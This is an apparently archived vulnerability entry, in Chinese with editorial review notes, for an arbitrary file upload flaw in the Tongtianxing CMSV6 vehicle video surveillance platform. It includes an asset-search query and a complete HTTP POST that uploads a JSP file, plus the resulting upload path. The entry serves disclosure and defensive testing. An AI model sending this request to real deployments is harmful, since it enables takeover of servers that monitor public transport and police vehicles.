---
fofa: ""
source: "wy876 漏洞文库"
product: "通天星 CMSV6 车载视频监控平台"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
category_recommendation: "IOT安全/其他设备"
title: "通天星CMSV6车载视频监控平台inspect_file存在任意文件上传漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：inspect_fileupload accessible; writable/software dir andJSPexec;authunknown"
side_effects: "未执行；本文需注意的操作影响：分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。"
source_status: "unknown"
id: "vw-b3fddf8c67d18bac65311434"
entity_id: "ve-b3fddf8c67d18bac65311434"
schema_version: "1"
previous_fofa_unverified: "web.body="
hunter: "web.body=\"./open/webApi.html\""
---

## 核对与使用边界

- 分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。

- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：inspect_fileupload accessible; writable/software dir andJSPexec;authunknown

- **结论使用边界（1）**：文件Content-Type application/ocet-stream拼错，应octet-stream但未验证服务端影响。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：固定185..._1.jsp路径仅样例，需从真实响应提取，缺响应文字/源码/版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（3）**：载荷打印标记可验证JSP运行而非直接OS命令；不能把上传成功当完整服务器控制。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：外部nuclei只链接不等于已验证；行业归类/Hunter元数据需修。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 通天星CMSV6车载视频监控平台 inspect_file存在任意文件上传漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台 inspect_file存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征


# 四、漏洞复现
```plain
POST /inspect_file/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Length: 209
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: multipart/form-data; boundary=00content0boundary00
Accept-Encoding: gzip, deflate

--00content0boundary00
Content-Disposition: form-data; name="uploadFile"; filename="1.jsp"
Content-Type: application/ocet-stream

<% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
--00content0boundary00--
```


上传文件位置

```plain
/upload/software/185859979470834_1.jsp
```


[tongtianxing-inspectfile-upload.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/29512878/1735362336502-b3be6c93-a873-4f21-ae01-ef858e24e559.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sr4td7gzb4nxdfpf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
